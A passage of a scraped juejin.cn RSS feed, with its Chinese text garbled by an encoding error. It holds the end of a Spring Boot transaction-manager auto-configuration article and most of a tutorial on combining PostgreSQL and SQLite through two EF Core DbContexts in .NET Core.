<span class="hljs-meta">@ConditionalOnSingleCandidate(DataSource.class)</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcTransactionManagerConfiguration</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@ConditionalOnMissingBean(TransactionManager.class)</span>
    DataSourceTransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(Environment environment, DataSource dataSource,
          ObjectProvider&lt;TransactionManagerCustomizers&gt; transactionManagerCustomizers)</span> {
       <span class="hljs-type">DataSourceTransactionManager</span> <span class="hljs-variable">transactionManager</span> <span class="hljs-operator">=</span> createTransactionManager(environment, dataSource);
       <span class="hljs-comment">//åº”ç”¨ TransactionManagerCustomizers åŒ…è£… Bean é›†åˆ</span>
       transactionManagerCustomizers.ifAvailable((customizers) -&gt; customizers.customize(transactionManager));
       <span class="hljs-keyword">return</span> transactionManager;
    }

    <span class="hljs-comment">//åˆ›å»º jdbc äº‹åŠ¡ç®¡ç†å™¨</span>
    <span class="hljs-keyword">private</span> DataSourceTransactionManager <span class="hljs-title function_">createTransactionManager</span><span class="hljs-params">(Environment environment, DataSource dataSource)</span> {
       <span class="hljs-keyword">return</span> environment.getProperty(<span class="hljs-string">"spring.dao.exceptiontranslation.enabled"</span>, Boolean.class, Boolean.TRUE)
             ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTransactionManager</span>(dataSource) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(dataSource);
    }

}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ConditionalOnClass(PlatformTransactionManager.class)</span>
<span class="hljs-meta">@AutoConfiguration(before = TransactionAutoConfiguration.class)</span>
<span class="hljs-meta">@EnableConfigurationProperties(TransactionProperties.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionManagerCustomizationAutoConfiguration</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-meta">@ConditionalOnMissingBean</span>
    TransactionManagerCustomizers <span class="hljs-title function_">platformTransactionManagerCustomizers</span><span class="hljs-params">(
          ObjectProvider&lt;TransactionManagerCustomizer&lt;?&gt;&gt; customizers)</span> {
          <span class="hljs-comment">//åº”ç”¨ TransactionManagerCustomizer é›†åˆ Bean</span>
       <span class="hljs-keyword">return</span> TransactionManagerCustomizers.of(customizers.orderedStream().toList());
    }

    <span class="hljs-meta">@Bean</span>
    ExecutionListenersTransactionManagerCustomizer <span class="hljs-title function_">transactionExecutionListeners</span><span class="hljs-params">(
          ObjectProvider&lt;TransactionExecutionListener&gt; listeners)</span> {
          <span class="hljs-comment">//åº”ç”¨ TransactionExecutionListener é›†åˆ Bean</span>
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutionListenersTransactionManagerCustomizer</span>(listeners.orderedStream().toList());
    }

}
</code></pre>
<p>é‚£æˆ‘ä»¬åªè¦å®šä¹‰ä¸€ä¸ªæˆ–è€…å¤šä¸ª <code>TransactionExecutionListener</code> äº¤ç»™ <code>Spring</code> ç®¡ç†å°±ä¼šè‡ªåŠ¨é…åº”ç”¨åˆ°å½“å‰æ•°æ®æºçš„äº‹åŠ¡ç®¡ç†å™¨ä¸Šï¼Œç›‘å¬äº‹åŠ¡çš„æ‰§è¡Œé˜¶æ®µ</p>
<h3 data-id="heading-21">@Bean æ›¿æ¢</h3>
<p><code>SpringBoot</code> ä¸­è‡ªåŠ¨é…ç½®ç±»çš„ <code>@Bean</code> å£°æ˜éƒ½åŠ äº†æ¡ä»¶æ³¨è§£å½“ä¸å­˜åœ¨è¿™ä¸ª <code>Bean</code> çš„æ—¶å€™æ‰ä¼šç”Ÿæ•ˆï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæºç ä¸­çš„å£°æ˜æ‹·è´è¿‡æ¥ä¿®æ”¹å…¶ä¸­ä¸€äº›éƒ¨åˆ†ï¼Œä¾‹å¦‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Bean</span>
<span class="hljs-comment">//@ConditionalOnMissingBean å»æ‰è¿™ä¸ª</span>
<span class="hljs-keyword">public</span> SqlSessionTemplate <span class="hljs-title function_">sqlSessionTemplate</span><span class="hljs-params">(SqlSessionFactory sqlSessionFactory)</span> {
    <span class="hljs-comment">//...ä¿®æ”¹è‡ªå®šä¹‰é€»è¾‘</span>
    <span class="hljs-type">ExecutorType</span> <span class="hljs-variable">executorType</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.properties.getExecutorType();
    <span class="hljs-keyword">if</span> (executorType != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionTemplate</span>(sqlSessionFactory, executorType);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionTemplate</span>(sqlSessionFactory);
    }
}
</code></pre>
<h2 data-id="heading-22">ç»“è¯­</h2>
<p>é™æ€æ–‡æœ¬çš„æ–¹å¼å§‹ç»ˆæ— æ³•å½¢è±¡çš„è§£æè¯¦ç»†çš„ä»£ç æ‰§è¡Œè¿‡ç¨‹ï¼Œè¿™é‡Œåªèƒ½æä¾›ä¸€äº›å…³é”®ä»£ç ï¼Œè¦æ·±å…¥ç†è§£è¿˜éœ€è¦æˆ‘ä»¬è‡ªå·±å¤šè¯»æºç ï¼Œå¤šå®è·µã€‚</p>
<h3 data-id="heading-23">å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œè®°å¾—ç‚¹èµåŠ å…³æ³¨ï¼ä½ çš„æ”¯æŒå°±æ˜¯æˆ‘ç»§ç»­åˆ›ä½œçš„åŠ¨åŠ›ï¼</h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŒåº“ååŒï¼Œå„å–æ‰€é•¿ï¼š.NET Core ä¸­ PostgreSQL ä¸ SQLite çš„ä¼˜é›…èåˆå®æˆ˜]]></title>    <link>https://juejin.cn/post/7603771025856479283</link>    <guid>https://juejin.cn/post/7603771025856479283</guid>    <pubDate>2026-02-08T06:12:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603771025856479283" data-draft-id="7603651855236792329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŒåº“ååŒï¼Œå„å–æ‰€é•¿ï¼š.NET Core ä¸­ PostgreSQL ä¸ SQLite çš„ä¼˜é›…èåˆå®æˆ˜"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-08T06:12:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§é»„è¯„æµ‹"/> <meta itemprop="url" content="https://juejin.cn/user/714024404135696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŒåº“ååŒï¼Œå„å–æ‰€é•¿ï¼š.NET Core ä¸­ PostgreSQL ä¸ SQLite çš„ä¼˜é›…èåˆå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/714024404135696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§é»„è¯„æµ‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T06:12:53.000Z" title="Sun Feb 08 2026 06:12:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£åº”ç”¨å¼€å‘ä¸­ï¼Œå•ä¸€æ•°æ®åº“æ¶æ„å¾€å¾€éš¾ä»¥æ»¡è¶³æ‰€æœ‰åœºæ™¯éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½å¸Œæœ›ï¼š</p>
<ul>
<li><strong>ä¸»ä¸šåŠ¡æ•°æ®</strong>å­˜å…¥åŠŸèƒ½å¼ºå¤§ã€æ”¯æŒé«˜å¹¶å‘çš„ <strong>PostgreSQL</strong>ï¼›</li>
<li><strong>æœ¬åœ°ç¼“å­˜ã€è¾¹ç¼˜è®¡ç®—æˆ–åµŒå…¥å¼æ—¥å¿—</strong>ä½¿ç”¨è½»é‡ã€é›¶é…ç½®çš„ <strong>SQLite</strong>ã€‚</li>
</ul>
<p>è¿™ç§â€œæ··åˆæŒä¹…åŒ–â€ï¼ˆPolyglot Persistenceï¼‰ç­–ç•¥æ­£å˜å¾—è¶Šæ¥è¶Šæ™®éã€‚è€Œ .NET Core å‡­å€Ÿå…¶å¼ºå¤§çš„ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰ä½“ç³»å’Œ Entity Framework Coreï¼ˆEF Coreï¼‰çš„å¤šä¸Šä¸‹æ–‡æ”¯æŒï¼Œä¸ºåŒæ•°æ®åº“æ¶æ„æä¾›äº†ä¼˜é›…çš„å®ç°è·¯å¾„ã€‚</p>
<p>æœ¬æ–‡å°†æ‰‹æŠŠæ‰‹å¸¦ä½ æ„å»ºä¸€ä¸ªåŒæ—¶ä½¿ç”¨ <strong>PostgreSQLï¼ˆä¸»åº“ï¼‰</strong> å’Œ <strong>SQLiteï¼ˆè¾…åŠ©åº“ï¼‰</strong> çš„ .NET Core åº”ç”¨ï¼Œå¹¶åˆ†äº«ç”Ÿäº§çº§çš„æœ€ä½³å®è·µã€‚</p>
<hr/>
<h3 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆé€‰æ‹© PostgreSQL + SQLiteï¼Ÿ</h3>






























<table><thead><tr><th>åœºæ™¯</th><th>PostgreSQL</th><th>SQLite</th></tr></thead><tbody><tr><td><strong>æ•°æ®è§„æ¨¡</strong></td><td>TB çº§ï¼Œå¤šç”¨æˆ·å¹¶å‘</td><td>GB çº§ï¼Œå•æœº/è¾¹ç¼˜</td></tr><tr><td><strong>éƒ¨ç½²å¤æ‚åº¦</strong></td><td>éœ€ç‹¬ç«‹æœåŠ¡</td><td>é›¶é…ç½®ï¼Œæ–‡ä»¶å³æ•°æ®åº“</td></tr><tr><td><strong>äº‹åŠ¡ä¸ä¸€è‡´æ€§</strong></td><td>å®Œæ•´ ACIDï¼Œæ”¯æŒåˆ†å¸ƒå¼äº‹åŠ¡</td><td>å•æ–‡ä»¶ ACIDï¼Œä¸æ”¯æŒå¹¶å‘å†™</td></tr><tr><td><strong>å…¸å‹ç”¨é€”</strong></td><td>ç”¨æˆ·è´¦æˆ·ã€è®¢å•ã€æ ¸å¿ƒä¸šåŠ¡</td><td>æœ¬åœ°ç¼“å­˜ã€è®¾å¤‡æ—¥å¿—ã€ä¸´æ—¶ä»»åŠ¡é˜Ÿåˆ—</td></tr></tbody></table>
<blockquote>
<p>âœ… ç»„åˆä¼˜åŠ¿ï¼š<br/>
ä¸»ä¸šåŠ¡å¼ºä¸€è‡´ + è¾¹ç¼˜æ•°æ®è½»é‡åŒ– = æ¶æ„å¼¹æ€§ä¸æ€§èƒ½å…¼é¡¾</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">äºŒã€é¡¹ç›®ç»“æ„è®¾è®¡</h3>
<p>æˆ‘ä»¬å°†åˆ›å»ºä¸¤ä¸ªç‹¬ç«‹çš„ <code>DbContext</code>ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒæ•°æ®åº“ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">MyApp/
â”œâ”€â”€ Data/
â”‚   â”œâ”€â”€ MainDbContext.cs        <span class="hljs-comment">// PostgreSQL</span>
â”‚   â””â”€â”€ LocalDbContext.cs       <span class="hljs-comment">// SQLite</span>
â”œâ”€â”€ Models/
â”‚   â”œâ”€â”€ User.cs                 <span class="hljs-comment">// å­˜äº PostgreSQL</span>
â”‚   â””â”€â”€ DeviceLog.cs            <span class="hljs-comment">// å­˜äº SQLite</span>
â”œâ”€â”€ Services/
â”‚   â”œâ”€â”€ UserService.cs
â”‚   â””â”€â”€ LogService.cs
â””â”€â”€ Program.cs
</code></pre>
<hr/>
<h3 data-id="heading-2">ä¸‰ã€Step-by-Step å®ç°</h3>
<h4 data-id="heading-3">1. å®‰è£…å¿…è¦ NuGet åŒ…</h4>
<pre><code class="hljs language-csharp" lang="csharp">dotnet <span class="hljs-keyword">add</span> package Npgsql.EntityFrameworkCore.PostgreSQL
dotnet <span class="hljs-keyword">add</span> package Microsoft.EntityFrameworkCore.Sqlite
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼šä¸è¦æ··ç”¨åŒä¸€ä¸ª DbContext æ³¨å†Œå¤šä¸ªæä¾›ç¨‹åºï¼</p>
</blockquote>
<h4 data-id="heading-4">2. å®šä¹‰æ¨¡å‹ï¼ˆModelsï¼‰</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Models/User.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">User</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Id { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">default</span>!;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Email { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">default</span>!;
}

<span class="hljs-comment">// Models/DeviceLog.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DeviceLog</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">long</span> Id { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> DateTime Timestamp { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Message { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-literal">default</span>!;
}
</code></pre>
<h4 data-id="heading-5">3. åˆ›å»ºä¸¤ä¸ª DbContext</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// Data/MainDbContext.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainDbContext</span> : DbContext
{
    <span class="hljs-keyword">public</span> DbSet&lt;User&gt; Users { get; set; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainDbContext</span><span class="hljs-params">(DbContextOptions&lt;MainDbContext&gt; options)</span> : base(options) {</span> }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-type">void</span> <span class="hljs-title">OnModelCreating</span><span class="hljs-params">(ModelBuilder modelBuilder)</span>
    </span>{
        modelBuilder.<span class="hljs-built_in">Entity</span>&lt;User&gt;().<span class="hljs-built_in">ToTable</span>(<span class="hljs-string">"users"</span>);
    }
}

<span class="hljs-comment">// Data/LocalDbContext.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalDbContext</span> : DbContext
{
    <span class="hljs-keyword">public</span> DbSet&lt;DeviceLog&gt; DeviceLogs { get; set; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LocalDbContext</span><span class="hljs-params">(DbContextOptions&lt;LocalDbContext&gt; options)</span> : base(options) {</span> }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-type">void</span> <span class="hljs-title">OnConfiguring</span><span class="hljs-params">(DbContextOptionsBuilder optionsBuilder)</span>
    </span>{
        <span class="hljs-comment">// å¯é€‰ï¼šè‹¥æœªé€šè¿‡ DI æ³¨å…¥è¿æ¥å­—ç¬¦ä¸²</span>
        <span class="hljs-comment">// optionsBuilder.UseSqlite("Data Source=device_logs.db");</span>
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-type">void</span> <span class="hljs-title">OnModelCreating</span><span class="hljs-params">(ModelBuilder modelBuilder)</span>
    </span>{
        modelBuilder.<span class="hljs-built_in">Entity</span>&lt;DeviceLog&gt;().<span class="hljs-built_in">ToTable</span>(<span class="hljs-string">"device_logs"</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">4. åœ¨ Program.cs ä¸­æ³¨å†ŒåŒä¸Šä¸‹æ–‡</h4>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">builder</span> = WebApplication.CreateBuilder(args)<span class="hljs-comment">;</span>

// æ³¨å†Œ PostgreSQL ä¸Šä¸‹æ–‡
builder.Services.AddDbContext&lt;MainDbContext&gt;(<span class="hljs-attr">options</span> =&gt;
    options.UseNpgsql(builder.Configuration.GetConnectionString("Postgres")))<span class="hljs-comment">;</span>

// æ³¨å†Œ SQLite ä¸Šä¸‹æ–‡
builder.Services.AddDbContext&lt;LocalDbContext&gt;(<span class="hljs-attr">options</span> =&gt;
    options.UseSqlite(builder.Configuration.GetConnectionString("Sqlite")))<span class="hljs-comment">;</span>

// è‡ªåŠ¨åˆ›å»ºæ•°æ®åº“ï¼ˆä»…å¼€å‘ç¯å¢ƒå»ºè®®ï¼‰
using var <span class="hljs-attr">scope</span> = builder.Services.BuildServiceProvider().CreateScope()<span class="hljs-comment">;</span>
scope.ServiceProvider.GetRequiredService&lt;MainDbContext&gt;().Database.EnsureCreated()<span class="hljs-comment">;</span>
scope.ServiceProvider.GetRequiredService&lt;LocalDbContext&gt;().Database.EnsureCreated()<span class="hljs-comment">;</span>
</code></pre>
<p><code>appsettings.json</code> é…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ConnectionStrings"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Postgres"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Host=localhost;Database=myapp;Username=postgres;Password=secret"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Sqlite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Data Source=device_logs.db"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-7">5. ç¼–å†™æœåŠ¡å±‚ï¼ŒæŒ‰éœ€æ³¨å…¥</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Services/UserService.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> MainDbContext _db;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">UserService</span>(<span class="hljs-params">MainDbContext db</span>)</span> =&gt; _db = db;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;User&gt; <span class="hljs-title">CreateUser</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name, <span class="hljs-built_in">string</span> email</span>)</span>
    {
        <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> User { Name = name, Email = email };
        _db.Users.Add(user);
        <span class="hljs-keyword">await</span> _db.SaveChangesAsync();
        <span class="hljs-keyword">return</span> user;
    }
}

<span class="hljs-comment">// Services/LogService.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">LogService</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> LocalDbContext _localDb;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LogService</span>(<span class="hljs-params">LocalDbContext localDb</span>)</span> =&gt; _localDb = localDb;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">LogMessage</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> msg</span>)</span>
    {
        _localDb.DeviceLogs.Add(<span class="hljs-keyword">new</span> DeviceLog
        {
            Timestamp = DateTime.UtcNow,
            Message = msg
        });
        <span class="hljs-keyword">await</span> _localDb.SaveChangesAsync();
    }
}
</code></pre>
<p>æ§åˆ¶å™¨ä¸­ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">app.MapPost(<span class="hljs-string">"/user"</span>, <span class="hljs-keyword">async</span> (UserService userService, HttpRequest req) =&gt;
{
    <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">await</span> userService.CreateUser(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"alice@example.com"</span>);
    <span class="hljs-keyword">return</span> Results.Ok(user);
});

app.MapPost(<span class="hljs-string">"/log"</span>, <span class="hljs-keyword">async</span> (LogService logService, [FromBody] string msg) =&gt;
{
    <span class="hljs-keyword">await</span> logService.LogMessage(msg);
    <span class="hljs-keyword">return</span> Results.Ok();
});
</code></pre>
<hr/>
<h3 data-id="heading-8">å››ã€æœ€ä½³å®è·µä¸é¿å‘æŒ‡å—</h3>
<h4 data-id="heading-9">âœ… 1. <strong>ä¸¥æ ¼åˆ†ç¦»å…³æ³¨ç‚¹</strong></h4>
<ul>
<li>ä¸è¦åœ¨åŒä¸€ä¸ªä¸šåŠ¡æ–¹æ³•ä¸­åŒæ—¶æ“ä½œä¸¤ä¸ª DbContextï¼ˆé™¤éå¿…è¦ï¼‰ï¼›</li>
<li>è‹¥éœ€è·¨åº“äº‹åŠ¡ï¼Œè€ƒè™‘æœ€ç»ˆä¸€è‡´æ€§ï¼ˆå¦‚é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—è¡¥å¿ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-10">âœ… 2. <strong>è¿æ¥å­—ç¬¦ä¸²å®‰å…¨</strong></h4>
<ul>
<li>PostgreSQL å¯†ç å‹¿ç¡¬ç¼–ç ï¼Œä½¿ç”¨ Secret Manager æˆ– Azure Key Vaultï¼›</li>
<li>SQLite è·¯å¾„å»ºè®®ä½¿ç”¨ <code>Path.Combine(Directory.GetCurrentDirectory(), "data", "logs.db")</code> ç¡®ä¿å¯ç§»æ¤æ€§ã€‚</li>
</ul>
<h4 data-id="heading-11">âœ… 3. <strong>è¿ç§»ï¼ˆMigrationsï¼‰ç®¡ç†</strong></h4>
<ul>
<li>
<p>ä¸ºæ¯ä¸ª DbContext å•ç‹¬å¯ç”¨è¿ç§»ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">dotnet ef migrations <span class="hljs-keyword">add</span> InitialMain -c MainDbContext -o Migrations/Postgres
dotnet ef migrations <span class="hljs-keyword">add</span> InitialLocal -c LocalDbContext -o Migrations/Sqlite
</code></pre>
</li>
<li>
<p>ç”Ÿäº§ç¯å¢ƒå»ºè®®æ‰‹åŠ¨å®¡æ ¸ SQL è„šæœ¬ã€‚</p>
</li>
</ul>
<h4 data-id="heading-12">âœ… 4. <strong>æ€§èƒ½ä¸èµ„æº</strong></h4>
<ul>
<li>SQLite é»˜è®¤ä¸æ”¯æŒé«˜å¹¶å‘å†™å…¥ï¼Œé¿å…åœ¨ Web API çƒ­ç‚¹è·¯å¾„é¢‘ç¹å†™æ—¥å¿—ï¼›</li>
<li>å¯æ­é… <code>Microsoft.Data.Sqlite</code> çš„ WAL æ¨¡å¼æå‡å¹¶å‘è¯»æ€§èƒ½ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-13">äº”ã€é€‚ç”¨åœºæ™¯æ¨è</h3>
<ul>
